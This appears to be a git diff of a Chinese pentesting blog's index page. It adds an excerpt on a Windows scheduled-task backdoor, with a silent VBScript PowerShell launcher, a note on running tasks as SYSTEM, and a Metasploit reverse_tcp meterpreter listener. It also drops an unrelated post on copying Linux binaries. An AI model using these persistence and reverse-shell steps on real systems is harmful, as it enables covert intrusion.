@@ -117,6 +117,102 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/05/24/schtasks定时后门.html" >powershell定时任务后门</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-05-24  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
+schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
+schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
+command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
+set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
+shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>msf接收多个shell可以如下这样做：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML文件如下:</p>
+	
+
+	</div>
+  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
+schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
+schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
+command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
+set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
+shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>msf接收多个shell可以如下这样做：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML文件如下:</p>
+	
+	</div>
+  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/05/23/xss-get-ip.html" >XSS获取内网地址</a>
 		</h3>
 		</div>
@@ -627,142 +723,6 @@ header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/03/09/copy-shared-lib.html" >Linux复制带动态库的命令</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-03-09  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
-<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
-	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
-	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
-	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
-
-if [ $# !&#x3D; 2 ] ; then
-    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
-    exit 1
-fi
-
-PATH_TO_BINARY&#x3D;&quot;$1&quot;
-TARGET_FOLDER&#x3D;&quot;$2&quot;
-
-# if we cannot find the the binary we have to abort
-if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
-    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
-    exit 1
-fi
-
-# copy the binary to the target folder
-# create directories if required
-echo &quot;---&gt; copy binary itself&quot;
-cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
-
-# copy the required shared libs to the target folder
-# create directories if required
-echo &quot;---&gt; copy libraries&quot;
-for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
-   if [ -f &quot;$lib&quot; ] ; then
-        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
-   fi  
-done
-
-# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
-# however, I&#39;ve not tested that yet
-# create lib64 - if required and link the content from lib to it
-if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
-    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
-fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
-</ul>
-
-	
-
-	</div>
-  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
-<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
-	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
-	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
-	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
-
-if [ $# !&#x3D; 2 ] ; then
-    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
-    exit 1
-fi
-
-PATH_TO_BINARY&#x3D;&quot;$1&quot;
-TARGET_FOLDER&#x3D;&quot;$2&quot;
-
-# if we cannot find the the binary we have to abort
-if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
-    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
-    exit 1
-fi
-
-# copy the binary to the target folder
-# create directories if required
-echo &quot;---&gt; copy binary itself&quot;
-cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
-
-# copy the required shared libs to the target folder
-# create directories if required
-echo &quot;---&gt; copy libraries&quot;
-for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
-   if [ -f &quot;$lib&quot; ] ; then
-        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
-   fi  
-done
-
-# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
-# however, I&#39;ve not tested that yet
-# create lib64 - if required and link the content from lib to it
-if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
-    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
-fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -820,7 +780,7 @@ fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -841,6 +801,10 @@ fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
       </li>
     
@@ -854,10 +818,6 @@ fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
     
       <li>
         <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
       </li>
     
   </ul>
